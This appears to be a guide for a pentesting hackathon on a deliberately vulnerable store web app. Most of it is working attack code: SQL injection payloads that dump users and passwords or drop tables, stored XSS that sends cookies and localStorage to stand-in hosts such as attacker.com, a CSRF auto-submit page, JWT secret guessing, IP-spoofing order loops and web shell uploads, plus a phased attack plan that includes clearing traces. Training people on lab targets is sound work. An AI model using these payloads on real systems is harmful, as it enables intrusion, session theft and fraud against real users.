# 🎯 Hackathon Vulnerability Guide - Store Pentesting Challenge

## Overview
This document provides a comprehensive guide to the intentional vulnerabilities present in the Store Hackathon application. These vulnerabilities are designed for educational pentesting purposes and competitive scoring.

⚠️ **WARNING**: This application is designed for educational purposes only. These vulnerabilities are intentional and should NEVER be present in production applications.

---

## 🏆 Scoring Mechanism

Based on the scoring system in `/api/scores`:
- **1 point** per order with total value of $0 where items are payable to Team 1
- **X points** for any order items payable to your team (X = price × quantity)

**Goal**: Maximize points by either:
1. Creating expensive products payable to your team and tricking others to buy them
2. Placing many free orders 
3. Manipulating existing orders to be payable to your team

---

## 🔥 Critical Vulnerabilities (High Impact)

### **1. SQL Injection - Product Search**
**Location**: `GET /api/products/search`  
**Severity**: Critical  
**File**: `apps/backend/src/routes/products.js` (Lines 142-162)

**Vulnerability**: The search endpoint uses `$queryRawUnsafe` with direct string interpolation:
```javascript
const rawQuery = `
  SELECT id, name, description, price, image, category, "sellerId", "createdAt", "updatedAt"
  FROM products 
  WHERE name ILIKE '%${q}%'  // ← Direct injection point
  ORDER BY "createdAt" DESC
`;
```

**Exploitation Examples**:
```bash
# Extract all users and passwords
curl "http://localhost:3001/api/products/search?q='; SELECT username, password FROM users--"

# Create expensive product payable to Team 2
curl "http://localhost:3001/api/products/search?q='; INSERT INTO products (name, description, price, \"sellerId\") VALUES ('Golden Exploit', 'Worth 1000 points', 1000, 2); --"

# Set all product prices to 0
curl "http://localhost:3001/api/products/search?q='; UPDATE products SET price = 0 WHERE id > 0--"

# Change sellerId of expensive products to your team
curl "http://localhost:3001/api/products/search?q='; UPDATE products SET \"sellerId\" = 3 WHERE price > 100--"
```

**Scoring Impact**: 🌟🌟🌟🌟🌟
- Create high-value products payable to your team
- Steal database credentials
- Manipulate existing product ownership

---

### **2. Stored XSS - Forum Messages**
**Location**: `POST /api/forum` and Forum.vue component  
**Severity**: Critical  
**Files**: `apps/backend/src/routes/forum.js`, `apps/frontend/src/views/Forum.vue`

**Vulnerability**: Forum messages are stored without sanitization and rendered with `v-html`:
```javascript
// Backend - No sanitization
const newMessage = await req.prisma.forumMessage.create({
  data: {
    title: title, // Raw input - XSS vulnerable
    body: body,   // Raw input - XSS vulnerable
    authorId: userId,
  },
});
```

```vue
<!-- Frontend - Dangerous rendering -->
<h4 class="message-title" v-html="message.title"></h4>
<p v-html="message.body"></p>
```

**Exploitation Examples**:
```javascript
// Create malicious forum post
const xssAttack = {
  title: "🎁 FREE PRIZES! <script>fetch('https://attacker.com/steal?token='+document.cookie)</script>",
  body: `Check out this amazing deal! 
    <img src=x onerror="
      // Steal session cookies
      fetch('https://evil-team.com/steal', {
        method: 'POST',
        body: JSON.stringify({
          cookies: document.cookie,
          localStorage: JSON.stringify(localStorage)
        })
      });
      
      // Auto-purchase expensive items for victim
      fetch('/api/orders', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          items: [{id: 999, name: 'Golden Ticket', price: 1000, quantity: 10, sellerId: 2}],
          total: 10000,
          customer: {name: 'XSS Victim'},
          payment: {}
        })
      });
    " />`
};

fetch('http://localhost:3001/api/forum', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify(xssAttack)
});
```

**Scoring Impact**: 🌟🌟🌟🌟🌟
- Steal other users' session tokens
- Force other users to make purchases payable to your team
- Redirect users to phishing sites

---

### **3. CSRF - No Protection**
**Location**: All state-changing endpoints  
**Severity**: Critical  
**File**: `apps/backend/src/index.js` (CORS configuration)

**Vulnerability**: 
- No CSRF tokens implemented
- CORS allows all origins: `origin: true`
- Most cookies don't use `sameSite` protection

```javascript
app.use(
  cors({
    origin: true, // ← Allows all origins!
    credentials: true,
  })
);
```

**Exploitation Examples**:

Create a malicious website and post the link in the forum:
```html
<!-- evil-csrf-site.html -->
<!DOCTYPE html>
<html>
<head><title>Free Gift Cards!</title></head>
<body>
<h1>🎁 Click here to claim your prize!</h1>
<iframe src="about:blank" name="hiddenFrame" style="display:none;"></iframe>

<form id="exploit1" action="http://localhost:3001/api/products/register" 
      method="POST" target="hiddenFrame" enctype="multipart/form-data">
  <input type="hidden" name="name" value="Team 3 Exploit Product">
  <input type="hidden" name="description" value="CSRF Attack - Payable to Team 3">
  <input type="hidden" name="price" value="999.99">
  <input type="hidden" name="category" value="Exploit">
</form>

<form id="exploit2" action="http://localhost:3001/api/orders" 
      method="POST" target="hiddenFrame">
  <input type="hidden" name="items" value='[{"id":1,"price":0,"quantity":100,"sellerId":3}]'>
  <input type="hidden" name="total" value="0">
  <input type="hidden" name="customer" value='{"name":"CSRF Victim"}'>
</form>

<script>
// Auto-submit forms when page loads
setTimeout(() => document.getElementById('exploit1').submit(), 100);
setTimeout(() => document.getElementById('exploit2').submit(), 200);
</script>
</body>
</html>
```

Post in forum: "🎉 **FREE AMAZON GIFT CARDS** 🎉 Click here: `http://team3-evil-site.com/prizes.html`"

**Scoring Impact**: 🌟🌟🌟🌟🌟
- Trick users into creating products payable to your team
- Force users to place orders benefiting your team

---

## 💰 Business Logic Vulnerabilities (Direct Scoring)

### **4. Price Manipulation - Client-Side Trust**
**Location**: Order creation process  
**Severity**: Critical  
**Files**: `apps/frontend/src/stores/cart.js`, `apps/backend/src/routes/orders.js`

**Vulnerability**: The backend trusts price data sent from the frontend without validation.

**Exploitation Examples**:
```javascript
// Method 1: Browser DevTools manipulation
// In browser console on checkout page:
const cartStore = useCartStore();
cartStore.items.forEach(item => {
  item.price = 0.01;        // Pay almost nothing
  item.sellerId = 2;        // Make it payable to Team 2
  item.quantity = 100;      // Buy lots
});

// Method 2: Direct API call with manipulated prices
fetch('http://localhost:3001/api/orders', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify({
    items: [
      {
        id: 1,
        name: "Expensive Laptop",
        price: 0,           // Changed from $2000 to $0
        quantity: 50,
        sellerId: 2         // Payable to Team 2
      }
    ],
    total: 0,               // Pay nothing
    customer: { name: 'Exploit User' },
    payment: {}
  })
});

// Method 3: Burp Suite interception
// Intercept the checkout POST request and modify:
// - Change all prices to 0
// - Change sellerId to your team ID
// - Increase quantities
```

**Scoring Impact**: 🌟🌟🌟🌟🌟
- Buy unlimited products for free
- Redirect payments to your team

---

### **5. Seller ID Manipulation**
**Location**: Cart management and order creation  
**Severity**: Critical  

**Vulnerability**: The `sellerId` field can be manipulated client-side to redirect payments.

**Exploitation Examples**:
```javascript
// Intercept and modify all cart items before checkout
const originalFetch = window.fetch;
window.fetch = function(url, options) {
  if (url.includes('/api/orders') && options.method === 'POST') {
    const data = JSON.parse(options.body);
    // Redirect all payments to Team 3
    data.items.forEach(item => {
      item.sellerId = 3;
      item.price = Math.max(item.price, 100); // Ensure minimum value
    });
    options.body = JSON.stringify(data);
  }
  return originalFetch(url, options);
};
```

**Scoring Impact**: 🌟🌟🌟🌟🌟
- Steal revenue from all purchases
- Direct way to maximize points

---

## 🔐 Authentication & Session Vulnerabilities

### **6. JWT Secret Exposure & Weak Configuration**
**Location**: Authentication middleware  
**Severity**: High  
**File**: `apps/backend/src/middleware/auth.js`

**Vulnerability**: 
- JWT secret defaults to `"your-secret-key"` if not set
- Short access token expiry (1 minute) with long refresh token (24 hours)

**Exploitation Examples**:
```javascript
// If JWT secret is weak/default
import jwt from 'jsonwebtoken';

const secrets = ['your-secret-key', 'secret', '123456', 'admin'];

for (const secret of secrets) {
  try {
    const adminToken = jwt.sign(
      { userId: 1, username: 'admin', role: 'admin' },
      secret,
      { expiresIn: '24h' }
    );
    
    // Test if token works
    const response = await fetch('http://localhost:3001/api/users', {
      headers: { 'Authorization': `Bearer ${adminToken}` }
    });
    
    if (response.ok) {
      console.log(`Working secret: ${secret}`);
      console.log(`Admin token: ${adminToken}`);
      break;
    }
  } catch (e) {}
}
```

**Scoring Impact**: 🌟🌟🌟🌟
- Gain admin access to manipulate all data
- Access all user accounts

---

### **7. Refresh Token Theft via XSS**
**Location**: Token management  
**Severity**: High  

**Vulnerability**: Refresh tokens are stored in HTTP-only cookies but can be used via XSS to maintain persistence.

**Exploitation Examples**:
```javascript
// Combined XSS + Session hijacking in forum post
const persistentXSS = `
<img src=x onerror="
  // Steal and use refresh token
  fetch('/api/users/refresh', { credentials: 'include' })
    .then(r => r.json())
    .then(data => {
      // Now we have a fresh access token
      // Perform malicious actions
      fetch('/api/products/register', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          name: 'Hijacked Product',
          description: 'Session stolen by Team 4',
          price: 500,
          sellerId: 4
        })
      });
    });
" />
`;
```

---

## 📈 Rate Limiting & Business Logic Bypass

### **8. Order Limit Bypass - IP Spoofing**
**Location**: Order creation rate limiting  
**Severity**: Medium  
**File**: `apps/backend/src/routes/orders.js` (Lines 18-28)

**Vulnerability**: Order limits are based only on IP address, which can be spoofed.

```javascript
async function checkOrderLimits(prisma, customerName, ipAddress) {
  const orderCount = await prisma.order.count({
    where: {
      clientIpAddress: ipAddress, // ← Only checks IP
    },
  });
  return orderCount >= 50;
}
```

**Exploitation Examples**:
```bash
#!/bin/bash
# Bypass 50 order limit using IP spoofing
for i in {1..200}; do
  curl -X POST http://localhost:3001/api/orders \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -H "X-Real-IP: 172.16.0.$i" \
    -H "Cookie: accessToken=<valid_token>" \
    -d '{
      "items": [{"id": 1, "price": 0, "quantity": 1, "sellerId": 1}],
      "total": 0,
      "customer": {"name": "Bot User '$i'"},
      "payment": {}
    }'
  
  echo "Placed order $i with spoofed IP"
  sleep 0.1
done
```

**Scoring Impact**: 🌟🌟🌟
- Place unlimited free orders (1 point each)
- Potentially 200+ points from this alone

---

## 🔍 Information Disclosure

### **9. PII Data Exposure**
**Location**: User profile endpoints  
**Severity**: Medium  
**File**: User model and API responses

**Vulnerability**: The `PII` field is exposed in API responses and could contain sensitive information.

**Exploitation Examples**:
```bash
# Extract PII from all users (requires admin access or SQL injection)
curl http://localhost:3001/api/users \
  -H "Cookie: accessToken=<admin_token>"

# Or via SQL injection
curl "http://localhost:3001/api/products/search?q='; SELECT username, \"PII\" FROM users--"
```

---

### **10. Verbose Error Messages**
**Location**: Various endpoints  
**Severity**: Low-Medium  

**Vulnerability**: Error messages may reveal internal structure or database information.

---

## 📁 File Upload Vulnerabilities

### **11. Unrestricted File Upload**
**Location**: Product image upload  
**Severity**: Medium  
**File**: `apps/backend/src/routes/products.js`

**Vulnerability**: While there's MIME type checking, file extension validation is weak.

**Exploitation Examples**:
```bash
# Upload potential web shell with image extension
curl -X POST http://localhost:3001/api/products/register \
  -H "Cookie: accessToken=<token>" \
  -F "name=Exploit Product" \
  -F "description=File upload test" \
  -F "price=1" \
  -F "image=@webshell.php.jpg"

# Try path traversal
curl -X POST http://localhost:3001/api/products/register \
  -H "Cookie: accessToken=<token>" \
  -F "name=Path Traversal" \
  -F "description=Test" \
  -F "price=1" \
  -F "image=@../../../../../../etc/passwd.jpg"
```

---

## 🍯 Honeypot Awareness

### **12. Fake Admin Endpoint**
**Location**: `/api/admin/login`  
**Severity**: N/A (Honeypot)  
**File**: `apps/backend/src/routes/admin.js`

**Note**: This is a honeypot that logs attempts. Smart teams will recognize this and avoid it:
```javascript
// Always returns "invalid credentials" but logs attempts
console.log(`[HONEYPOT] Admin login attempt: ${username}:${password} from IP: ${req.ip}`);
```

**Strategy**: Avoid this endpoint to prevent detection and wasted time.

---

## 🎯 Optimal Attack Strategy

### **Phase 1: Reconnaissance (5-10 minutes)**
1. **Map the application**: Identify all endpoints
2. **Test for SQL injection**: Try simple payloads on search
3. **Check forum for XSS**: Test basic script injection
4. **Analyze authentication**: Look for weak JWT secrets

### **Phase 2: Infrastructure Setup (10-15 minutes)**
1. **Create attack server**: Host CSRF/phishing pages
2. **Set up data collection**: Endpoint to receive stolen data
3. **Prepare automation scripts**: For order spamming

### **Phase 3: Exploitation (15-30 minutes)**
1. **SQL Injection for maximum impact**:
   ```sql
   -- Create expensive products payable to your team
   INSERT INTO products (name, description, price, "sellerId") VALUES 
   ('Team X Premium Package', 'High value exploit', 2000, X);
   
   -- Modify existing expensive products
   UPDATE products SET "sellerId" = X WHERE price > 500;
   ```

2. **XSS for user manipulation**:
   - Post compelling forum messages with XSS payloads
   - Auto-redirect users to purchase your expensive products
   - Steal session tokens for persistent access

3. **CSRF for passive attacks**:
   - Create malicious pages that auto-purchase your products
   - Share links in forum disguised as legitimate content

4. **Direct manipulation**:
   - Use price manipulation to buy competitors' products for $0
   - Redirect all purchases to your team using sellerId manipulation

5. **Volume attacks**:
   - Spam free orders using IP spoofing (200+ orders = 200+ points)
   - Automate the process for maximum efficiency

### **Phase 4: Defense (Ongoing)**
1. **Monitor competitors**: Watch for their XSS payloads in forum
2. **Counter-attack**: Use SQL injection to modify their products
3. **Clean up traces**: Remove obvious attack evidence

---

## 🏆 Scoring Calculations

### **Example Attack Sequence**:
```
Team 3's Strategy:

1. SQL Injection Setup:
   - Create 5 products worth 1000 points each → Potential: 5000 points
   
2. XSS Campaign:
   - Post 3 malicious forum messages
   - Each tricks 2 users into buying expensive products → 10 purchases × 1000 = 10,000 points
   
3. CSRF Website:
   - Host malicious site, post in forum
   - 5 users visit and auto-create expensive products → 5000 points
   
4. Order Spam:
   - Use IP spoofing to place 200 free orders → 200 points
   
5. Price Manipulation:
   - Buy competitors' products for $0
   - Modify sellerId to redirect to Team 3 → Variable points

Total Potential Score: 20,200+ points
```

---

## ⚠️ Ethical Guidelines

This application is designed for **educational purposes only**. When participating in this hackathon:

1. **Stay within bounds**: Only attack the designated application
2. **Document your work**: Keep notes for learning purposes
3. **Respect others**: Don't completely break the app for other teams
4. **Learn actively**: Focus on understanding the vulnerabilities, not just exploiting them
5. **Share knowledge**: Help others learn after the competition

---

## 🔧 Tools & Resources

### **Recommended Tools**:
- **Burp Suite Community**: HTTP interception and manipulation
- **OWASP ZAP**: Automated vulnerability scanning
- **Browser DevTools**: Client-side manipulation
- **curl/Postman**: API testing and exploitation
- **SQLMap**: Automated SQL injection testing

### **Useful Payloads**:
```sql
-- SQL Injection payloads for product search
'; DROP TABLE products; --
'; SELECT * FROM users; --
'; INSERT INTO products (...) VALUES (...); --
'; UPDATE products SET "sellerId" = X WHERE id > 0; --
```

```html
<!-- XSS payloads for forum -->
<script>alert('XSS')</script>
<img src=x onerror="fetch('/api/orders',{...})">
<iframe src="javascript:alert('XSS')"></iframe>
```

Remember: The goal is to learn about web security while having fun competing. Good luck! 🚀